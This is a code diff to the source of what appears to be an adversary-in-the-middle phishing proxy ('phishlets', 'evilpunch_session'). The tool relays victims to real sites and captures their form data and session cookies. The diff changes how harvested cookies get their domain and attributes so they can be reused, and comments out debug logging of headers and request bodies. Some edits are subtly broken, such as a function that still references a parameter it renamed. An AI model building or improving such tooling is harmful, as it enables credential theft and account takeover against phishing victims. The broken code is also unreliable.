@@ -1132,22 +1132,25 @@ async def capture_form_data(request, session_cookie: str, phishlet_id: int, prox
         debug_log(f"Error capturing form data: {e}", "ERROR")
         debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
 
-def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: str) -> dict:
+def _parse_cookie_metadata(cookie_name: str, cookie_value: str, host_domain: str) -> dict:
     """
     Parse cookie metadata and create detailed cookie object
     """
     debug_log(f"🔍 PARSING cookie metadata for '{cookie_name}' with proxy_domain: '{proxy_domain}'", "DEBUG")
+    # host_domain = _get_target_host_from_routing(proxy_domain)
+    debug_log(f"🔍 HOST DOMAIN: '{host_domain}'", "DEBUG")
+    debug_log(f"🔍 PROXY DOMAIN: '{proxy_domain}'", "DEBUG")
     
-    # Create detailed cookie object with metadata
+    # Create detailed cookie object with minimal defaults - only set what's explicitly available
     cookie_info = {
         "name": cookie_name,
         "value": cookie_value,
-        "domain": proxy_domain,  # REQUEST COOKIE DOMAIN SET TO PROXY_DOMAIN
+        "domain": host_domain,  # REQUEST COOKIE DOMAIN SET TO PROXY_DOMAIN
         "hostOnly": True,  # Default to true for proxy cookies
-        "path": "/",  # Default path
-        "secure": True,  # Default to secure for HTTPS
-        "httpOnly": False,  # Default to false
-        "sameSite": "lax",  # Default sameSite policy
+        "path": None,  # Will be set by browser defaults
+        "secure": None,  # Will be set by browser defaults
+        "httpOnly": None,  # Will be set by browser defaults
+        "sameSite": None,  # Will be set by browser defaults
         "session": False,  # Default to false (persistent cookies)
         "firstPartyDomain": "",
         "partitionKey": None,
@@ -1157,26 +1160,9 @@ def _parse_cookie_metadata(cookie_name: str, cookie_value: str, proxy_domain: st
     
     debug_log(f"🔍 REQUEST cookie domain set to proxy_domain: '{proxy_domain}' for cookie '{cookie_name}'", "DEBUG")
     
-    # Try to extract additional metadata from cookie name and value
+    # Only apply intelligent defaults for session flag based on cookie name
     if "session" in cookie_name.lower():
         cookie_info["session"] = True
-    
-    # Detect analytics cookies
-    if cookie_name.startswith("_ga"):
-        cookie_info["session"] = False
-        cookie_info["httpOnly"] = False
-        cookie_info["secure"] = False
-    
-    # Detect forum/session cookies
-    if "forum" in cookie_name.lower():
-        cookie_info["session"] = True
-        cookie_info["httpOnly"] = True
-    
-    # Detect authentication cookies
-    if any(auth_keyword in cookie_name.lower() for auth_keyword in ["auth", "token", "jwt", "csrf"]):
-        cookie_info["secure"] = True
-        cookie_info["httpOnly"] = True
-        cookie_info["sameSite"] = "strict"
     
     return cookie_info
 
@@ -1193,7 +1179,7 @@ async def capture_cookies(request, session_cookie: str, phishlet_id: int, proxy_
             for name, value in cookies.items():
                 if name != f'evilpunch_session_{phishlet_id}':
                     # Parse detailed cookie metadata
-                    cookie_info = _parse_cookie_metadata(name, value, proxy_domain)
+                    cookie_info = _parse_cookie_metadata(name, value, request.headers.get('Host', ''))
                     captured_cookies.append(cookie_info)
             
             if captured_cookies:
@@ -1311,11 +1297,12 @@ async def merge_cookies_to_session(session_cookie: str, phishlet_id: int, proxy_
         debug_log(f"Error merging cookies to session: {e}", "ERROR")
         debug_log(f"Traceback: {traceback.format_exc()}", "DEBUG")
 
-async def capture_response_cookies(response_headers, session_cookie: str, phishlet_id: int, proxy_domain: str):
+async def capture_response_cookies(response_headers, session_cookie: str, phishlet_id: int, proxy_domain: str, host_domain: str):
     """
     Capture cookies from response Set-Cookie headers and update session with detailed metadata.
     """
     try:
+        
         # Check for Set-Cookie headers in response
         set_cookie_headers = response_headers.getall('Set-Cookie', [])
         
@@ -1338,7 +1325,7 @@ async def capture_response_cookies(response_headers, session_cookie: str, phishl
                     debug_log(f"🔍 PROCESSING response Set-Cookie header: '{set_cookie_header}'", "DEBUG")
                     
                     # Parse Set-Cookie header to extract detailed cookie metadata
-                    cookie_info = _parse_set_cookie_header(set_cookie_header, proxy_domain)
+                    cookie_info = _parse_set_cookie_header(set_cookie_header, proxy_domain, host_domain)
                     
                     debug_log(f"🔍 Parsed cookie_info domain: '{cookie_info['domain']}' for cookie '{cookie_info['name']}'", "DEBUG")
                     
@@ -1366,13 +1353,13 @@ async def capture_response_cookies(response_headers, session_cookie: str, phishl
 
 # --- END SESSION MANAGEMENT ---
 
-def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
+def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str, host_domain: str) -> dict:
     """
     Parse Set-Cookie header to extract detailed cookie metadata
     Example: "sessionId=abc123; Domain=.example.com; Path=/; Secure; HttpOnly; SameSite=Strict"
     """
     try:
-        debug_log(f"🔍 PARSING Set-Cookie header: '{set_cookie_header}' with proxy_domain: '{proxy_domain}'", "DEBUG")
+        # debug_log(f"🔍⛑🐯🐱 PARSING Set-Cookie header: '{set_cookie_header}' with proxy_domain: '{proxy_domain}'", "DEBUG")
         
         # Split the header into parts
         parts = set_cookie_header.split(';')
@@ -1384,18 +1371,20 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
         else:
             name, value = cookie_part, ""
         
-        debug_log(f"🔍 Extracted cookie name: '{name.strip()}', value: '{value.strip()}'", "DEBUG")
+        debug_log(f"🔍🐯🐱 Extracted cookie name: '{name.strip()}', value: '{value.strip()}'", "DEBUG")
         
-        # Initialize cookie info
+        #  default domain should be hosts to proxy domain corespnds to current proxy domain
+        default_domain = _get_target_host_from_routing(host_domain)
+        # Initialize cookie info with minimal defaults - only set what's explicitly in the header
         cookie_info = {
             "name": name.strip(),
             "value": value.strip(),
-            "domain": proxy_domain,  # INITIAL DOMAIN SET TO PROXY_DOMAIN
-            "hostOnly": True,
-            "path": "/",
-            "secure": False,
-            "httpOnly": False,
-            "sameSite": "lax",
+            "domain": default_domain,  # INITIAL DOMAIN SET TO PROXY_DOMAIN
+            "hostOnly": True,  # Will be updated if Domain attribute is present
+            "path": None,  # Will be set if Path attribute is present
+            "secure": None,  # Will be set if Secure attribute is present
+            "httpOnly": None,  # Will be set if HttpOnly attribute is present
+            "sameSite": None,  # Will be set if SameSite attribute is present
             "session": False,
             "firstPartyDomain": "",
             "partitionKey": None,
@@ -1423,8 +1412,8 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
                 elif attr_name == 'path':
                     cookie_info['path'] = attr_value
                 elif attr_name == 'samesite':
-                    # if attr_value is none, set it to None (not the string "none")
-                    if attr_value is None:
+                    # Handle sameSite attribute properly
+                    if attr_value.lower() == 'none':
                         cookie_info['sameSite'] = None
                     else:
                         cookie_info['sameSite'] = attr_value.lower()
@@ -1456,32 +1445,15 @@ def _parse_set_cookie_header(set_cookie_header: str, proxy_domain: str) -> dict:
         
         debug_log(f"🔍 FINAL parsed cookie domain: '{cookie_info['domain']}' for cookie '{cookie_info['name']}'", "DEBUG")
         
-        # Apply intelligent defaults based on cookie name
+        # Only apply intelligent defaults for session flag based on cookie name
         if "session" in cookie_info['name'].lower():
             cookie_info['session'] = True
-        
-        # Detect analytics cookies
-        if cookie_info['name'].startswith("_ga"):
-            cookie_info['session'] = False
-            cookie_info['httpOnly'] = False
-            cookie_info['secure'] = False
-        
-        # Detect forum/session cookies
-        if "forum" in cookie_info['name'].lower():
-            cookie_info['session'] = True
-            cookie_info['httpOnly'] = True
-        
-        # Detect authentication cookies
-        if any(auth_keyword in cookie_info['name'].lower() for auth_keyword in ["auth", "token", "jwt", "csrf"]):
-            cookie_info['secure'] = True
-            cookie_info['httpOnly'] = True
-            cookie_info['sameSite'] = "strict"
         
         return cookie_info
         
     except Exception as e:
         # Fallback to basic parsing
-        return _parse_cookie_metadata(name, value, proxy_domain)
+        return _parse_cookie_metadata(name, value, host_domain)
 
 def _normalize_hostname(host: str) -> str:
     try:
@@ -2662,8 +2634,8 @@ async def proxy_handler(request):
     # If force_get modified the relative URL, use that; otherwise use original
     modified_rel = request.get('_modified_rel_url')
     target_url = f"https://{target_host}{modified_rel if modified_rel else request.rel_url}"
-    debug_log(f"Target URL: {target_url}", "DEBUG")
-    debug_log(f"Forward headers: {dict(forward_headers)}", "DEBUG")
+    # debug_log(f"Target URL: {target_url}", "DEBUG")
+    # debug_log(f"Forward headers: {dict(forward_headers)}", "DEBUG")
 
     try:
         debug_log("Initiating upstream request...", "DEBUG")
@@ -2754,109 +2726,109 @@ async def proxy_handler(request):
                 debug_log("No proxy configuration available for this request", "DEBUG")
             
             # ===== COMPREHENSIVE DEBUG LOGGING FOR FINAL REQUEST =====
-            debug_log("🚀🚀🚀🚀🚀🚀 FINAL REQUEST DEBUG INFO 🚀🚀🚀🚀🚀🚀", "INFO")
-            debug_log("=" * 80, "INFO")
+            # debug_log("🚀🚀🚀🚀🚀🚀 FINAL REQUEST DEBUG INFO 🚀🚀🚀🚀🚀🚀", "INFO")
+            # debug_log("=" * 80, "INFO")
             
-            # 1. Request Method and URL
-            debug_log(f"📋 REQUEST METHOD: {request.method}", "INFO")
-            debug_log(f"🌐 TARGET URL: {target_url}", "INFO")
-            debug_log(f"🔗 FULL REQUEST URL: {request_kwargs.get('url', 'N/A')}", "INFO")
+            # # 1. Request Method and URL
+            # debug_log(f"📋 REQUEST METHOD: {request.method}", "INFO")
+            # debug_log(f"🌐 TARGET URL: {target_url}", "INFO")
+            # debug_log(f"🔗 FULL REQUEST URL: {request_kwargs.get('url', 'N/A')}", "INFO")
             
-            # 2. Request Headers (Key Headers Only)
-            headers = request_kwargs.get('headers', {})
-            debug_log(f"📝 REQUEST HEADERS ({len(headers)} total):", "INFO")
-            key_headers = ['Host', 'User-Agent', 'Accept', 'Accept-Encoding', 'Accept-Language', 
-                          'Content-Type', 'Content-Length', 'Authorization', 'Cookie', 'Referer', 
-                          'Origin', 'X-Forwarded-For', 'X-Real-IP']
+            # # 2. Request Headers (Key Headers Only)
+            # headers = request_kwargs.get('headers', {})
+            # debug_log(f"📝 REQUEST HEADERS ({len(headers)} total):", "INFO")
+            # key_headers = ['Host', 'User-Agent', 'Accept', 'Accept-Encoding', 'Accept-Language', 
+            #               'Content-Type', 'Content-Length', 'Authorization', 'Cookie', 'Referer', 
+            #               'Origin', 'X-Forwarded-For', 'X-Real-IP']
             
-            for header_name in key_headers:
-                if header_name in headers:
-                    value = headers[header_name]
-                    # Truncate long values for readability
-                    if isinstance(value, str) and len(value) > 100:
-                        value = value[:100] + "... (truncated)"
-                    debug_log(f"   {header_name}: {value}", "INFO")
+            # for header_name in key_headers:
+            #     if header_name in headers:
+            #         value = headers[header_name]
+            #         # Truncate long values for readability
+            #         if isinstance(value, str) and len(value) > 100:
+            #             value = value[:100] + "... (truncated)"
+            #         debug_log(f"   {header_name}: {value}", "INFO")
             
-            # Show count of other headers
-            other_headers = [h for h in headers.keys() if h not in key_headers]
-            if other_headers:
-                debug_log(f"   ... and {len(other_headers)} other headers: {', '.join(other_headers[:5])}{'...' if len(other_headers) > 5 else ''}", "INFO")
+            # # Show count of other headers
+            # other_headers = [h for h in headers.keys() if h not in key_headers]
+            # if other_headers:
+            #     debug_log(f"   ... and {len(other_headers)} other headers: {', '.join(other_headers[:5])}{'...' if len(other_headers) > 5 else ''}", "INFO")
             
-            # 3. Request Body Information
-            request_data = request_kwargs.get('data')
-            if request_data:
-                debug_log(f"📦 REQUEST BODY:", "INFO")
-                debug_log(f"   Size: {len(request_data)} bytes", "INFO")
-                debug_log(f"   Type: {type(request_data).__name__}", "INFO")
+            # # 3. Request Body Information
+            # request_data = request_kwargs.get('data')
+            # if request_data:
+            #     debug_log(f"📦 REQUEST BODY:", "INFO")
+            #     debug_log(f"   Size: {len(request_data)} bytes", "INFO")
+            #     debug_log(f"   Type: {type(request_data).__name__}", "INFO")
                 
-                # Try to show content preview for text data
-                if isinstance(request_data, bytes):
-                    try:
-                        preview = request_data[:200].decode('utf-8')
-                        if len(request_data) > 200:
-                            preview += "... (truncated)"
-                        debug_log(f"   Preview: {preview}", "INFO")
-                    except UnicodeDecodeError:
-                        debug_log(f"   Preview: [Binary data - {len(request_data)} bytes]", "INFO")
-                elif isinstance(request_data, str):
-                    preview = request_data[:200]
-                    if len(request_data) > 200:
-                        preview += "... (truncated)"
-                    debug_log(f"   Preview: {preview}", "INFO")
-            else:
-                debug_log(f"📦 REQUEST BODY: None", "INFO")
+            #     # Try to show content preview for text data
+            #     if isinstance(request_data, bytes):
+            #         try:
+            #             preview = request_data[:200].decode('utf-8')
+            #             if len(request_data) > 200:
+            #                 preview += "... (truncated)"
+            #             debug_log(f"   Preview: {preview}", "INFO")
+            #         except UnicodeDecodeError:
+            #             debug_log(f"   Preview: [Binary data - {len(request_data)} bytes]", "INFO")
+            #     elif isinstance(request_data, str):
+            #         preview = request_data[:200]
+            #         if len(request_data) > 200:
+            #             preview += "... (truncated)"
+            #         debug_log(f"   Preview: {preview}", "INFO")
+            # else:
+            #     debug_log(f"📦 REQUEST BODY: None", "INFO")
             
-            # 4. Proxy Configuration Details
-            if proxy_config:
-                debug_log(f"🔀 PROXY CONFIGURATION:", "INFO")
-                debug_log(f"   Type: {proxy_config.get('type', 'N/A')}", "INFO")
-                debug_log(f"   URL: {proxy_config.get('url', 'N/A')}", "INFO")
-                debug_log(f"   Host: {proxy_config.get('host', 'N/A')}", "INFO")
-                debug_log(f"   Port: {proxy_config.get('port', 'N/A')}", "INFO")
-                if proxy_config.get('username'):
-                    debug_log(f"   Username: {proxy_config.get('username', 'N/A')}", "INFO")
-                    debug_log(f"   Password: {'*' * len(proxy_config.get('password', '')) if proxy_config.get('password') else 'N/A'}", "INFO")
-            else:
-                debug_log(f"🔀 PROXY CONFIGURATION: None (Direct Connection)", "INFO")
+            # # 4. Proxy Configuration Details
+            # if proxy_config:
+            #     debug_log(f"🔀 PROXY CONFIGURATION:", "INFO")
+            #     debug_log(f"   Type: {proxy_config.get('type', 'N/A')}", "INFO")
+            #     debug_log(f"   URL: {proxy_config.get('url', 'N/A')}", "INFO")
+            #     debug_log(f"   Host: {proxy_config.get('host', 'N/A')}", "INFO")
+            #     debug_log(f"   Port: {proxy_config.get('port', 'N/A')}", "INFO")
+            #     if proxy_config.get('username'):
+            #         debug_log(f"   Username: {proxy_config.get('username', 'N/A')}", "INFO")
+            #         debug_log(f"   Password: {'*' * len(proxy_config.get('password', '')) if proxy_config.get('password') else 'N/A'}", "INFO")
+            # else:
+            #     debug_log(f"🔀 PROXY CONFIGURATION: None (Direct Connection)", "INFO")
             
-            # 5. Request Parameters Summary
-            debug_log(f"⚙️  REQUEST PARAMETERS:", "INFO")
-            debug_log(f"   Allow Redirects: {request_kwargs.get('allow_redirects', 'N/A')}", "INFO")
-            debug_log(f"   SSL Verification: {request_kwargs.get('ssl', 'N/A')}", "INFO")
-            debug_log(f"   Verify SSL: {request_kwargs.get('verify_ssl', 'N/A')}", "INFO")
-            debug_log(f"   Auto Decompress: {request_kwargs.get('auto_decompress', 'N/A')}", "INFO")
-            debug_log(f"   Timeout: {request_kwargs.get('timeout', 'N/A')} seconds", "INFO")
+            # # 5. Request Parameters Summary
+            # debug_log(f"⚙️  REQUEST PARAMETERS:", "INFO")
+            # debug_log(f"   Allow Redirects: {request_kwargs.get('allow_redirects', 'N/A')}", "INFO")
+            # debug_log(f"   SSL Verification: {request_kwargs.get('ssl', 'N/A')}", "INFO")
+            # debug_log(f"   Verify SSL: {request_kwargs.get('verify_ssl', 'N/A')}", "INFO")
+            # debug_log(f"   Auto Decompress: {request_kwargs.get('auto_decompress', 'N/A')}", "INFO")
+            # debug_log(f"   Timeout: {request_kwargs.get('timeout', 'N/A')} seconds", "INFO")
             
-            # 5.1. Request Type Information
-            session_cookie = request.get('session_cookie')
-            url_path = str(request.rel_url)
-            proxy_auth_path = matching_phishlet.get('proxy_auth', '') if matching_phishlet else ''
-            is_proxy_auth_request = url_path == proxy_auth_path
-            debug_log(f"🔍 REQUEST TYPE ANALYSIS:", "INFO")
-            debug_log(f"   URL Path: {url_path}", "INFO")
-            debug_log(f"   Proxy Auth Path: {proxy_auth_path}", "INFO")
-            debug_log(f"   Is Proxy Auth Request: {is_proxy_auth_request}", "INFO")
-            debug_log(f"   Has Session Cookie: {bool(session_cookie)}", "INFO")
-            debug_log(f"   Session Cookie: {session_cookie[:8] + '...' if session_cookie else 'None'}", "INFO")
+            # # 5.1. Request Type Information
+            # session_cookie = request.get('session_cookie')
+            # url_path = str(request.rel_url)
+            # proxy_auth_path = matching_phishlet.get('proxy_auth', '') if matching_phishlet else ''
+            # is_proxy_auth_request = url_path == proxy_auth_path
+            # debug_log(f"🔍 REQUEST TYPE ANALYSIS:", "INFO")
+            # debug_log(f"   URL Path: {url_path}", "INFO")
+            # debug_log(f"   Proxy Auth Path: {proxy_auth_path}", "INFO")
+            # debug_log(f"   Is Proxy Auth Request: {is_proxy_auth_request}", "INFO")
+            # debug_log(f"   Has Session Cookie: {bool(session_cookie)}", "INFO")
+            # debug_log(f"   Session Cookie: {session_cookie[:8] + '...' if session_cookie else 'None'}", "INFO")
             
-            # 6. Phishlet Information
-            if matching_phishlet:
-                debug_log(f"🎣 PHISHLET INFORMATION:", "INFO")
-                debug_log(f"   Name: {matching_phishlet.get('name', 'N/A')}", "INFO")
-                debug_log(f"   Proxy Domain: {matching_phishlet.get('proxy_domain', 'N/A')}", "INFO")
-                debug_log(f"   Target URL: {matching_phishlet.get('target_url', 'N/A')}", "INFO")
-                hosts_count = len(matching_phishlet.get('hosts_to_proxy', []))
-                debug_log(f"   Hosts to Proxy: {hosts_count} configured", "INFO")
-            else:
-                debug_log(f"🎣 PHISHLET INFORMATION: None", "INFO")
+            # # 6. Phishlet Information
+            # if matching_phishlet:
+            #     debug_log(f"🎣 PHISHLET INFORMATION:", "INFO")
+            #     debug_log(f"   Name: {matching_phishlet.get('name', 'N/A')}", "INFO")
+            #     debug_log(f"   Proxy Domain: {matching_phishlet.get('proxy_domain', 'N/A')}", "INFO")
+            #     debug_log(f"   Target URL: {matching_phishlet.get('target_url', 'N/A')}", "INFO")
+            #     hosts_count = len(matching_phishlet.get('hosts_to_proxy', []))
+            #     debug_log(f"   Hosts to Proxy: {hosts_count} configured", "INFO")
+            # else:
+            #     debug_log(f"🎣 PHISHLET INFORMATION: None", "INFO")
             
-            # 7. Session Information
-            debug_log(f"🔧 SESSION INFORMATION:", "INFO")
-            debug_log(f"   Session Type: {type(session).__name__}", "INFO")
-            debug_log(f"   Session Closed: {session.closed}", "INFO")
+            # # 7. Session Information
+            # debug_log(f"🔧 SESSION INFORMATION:", "INFO")
+            # debug_log(f"   Session Type: {type(session).__name__}", "INFO")
+            # debug_log(f"   Session Closed: {session.closed}", "INFO")
             
-            debug_log("=" * 80, "INFO")
-            debug_log("🚀🚀🚀🚀🚀🚀 END FINAL REQUEST DEBUG INFO 🚀🚀🚀🚀🚀🚀", "INFO")
+            # debug_log("=" * 80, "INFO")
+            # debug_log("🚀🚀🚀🚀🚀🚀 END FINAL REQUEST DEBUG INFO 🚀🚀🚀🚀🚀🚀", "INFO")
             debug_log("", "INFO")  # Empty line for readability
             
             # Record start time for request timing
@@ -3048,10 +3020,10 @@ async def proxy_handler(request):
                 
                 debug_log(f"Cache decision for {url_path}: {'CACHE' if should_cache else 'NO_CACHE'}", "DEBUG")
                 # === END STATIC FILE CACHING ===
-                print(f"\n ---- resp.headers: {resp.headers}--------\n --------------------------------")
+                # print(f"\n ---- resp.headers: {resp.headers}--------\n --------------------------------")
                 # Patch response headers
                 patched_headers = patch_headers_in(resp.headers, incoming_host, target_host)
-                print(f"\n ---- patched_headers: {patched_headers}--------\n --------------------------------")
+                # print(f"\n ---- patched_headers: {patched_headers}--------\n --------------------------------")
                 
                 for h in ("content-length", "Content-Length", "content-encoding", "Content-Encoding"):
                     if h in patched_headers:
@@ -3189,9 +3161,9 @@ async def proxy_handler(request):
                         session_cookie = request['session_cookie']
                         phishlet_id = request.get('phishlet_id')
                         proxy_domain = request.get('proxy_domain', '')
-                        
+                        host_domain = request.headers.get('Host', '')
                         # Capture cookies from response headers
-                        await capture_response_cookies(resp.headers, session_cookie, phishlet_id, proxy_domain)
+                        await capture_response_cookies(resp.headers, session_cookie, phishlet_id, proxy_domain, host_domain)
                         
                         # Set cookie with appropriate attributes and phishlet-specific name
                         cookie_name = f'evilpunch_session_{phishlet_id}' if phishlet_id else 'evilpunch_session'
